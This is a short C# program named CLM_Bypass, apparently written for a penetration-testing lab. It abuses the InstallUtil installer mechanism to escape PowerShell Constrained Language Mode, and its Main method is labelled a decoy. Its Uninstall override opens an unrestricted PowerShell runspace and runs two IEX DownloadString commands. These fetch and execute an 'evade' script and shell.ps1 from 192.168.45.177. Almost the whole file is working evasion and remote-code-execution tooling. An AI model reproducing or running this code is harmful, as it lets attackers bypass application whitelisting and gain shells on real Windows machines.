using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace CLM_Bypass
{
    class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //PAYLOD OPTIONS:
            String cmd = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/evade'); IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/shell.ps1')";


            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
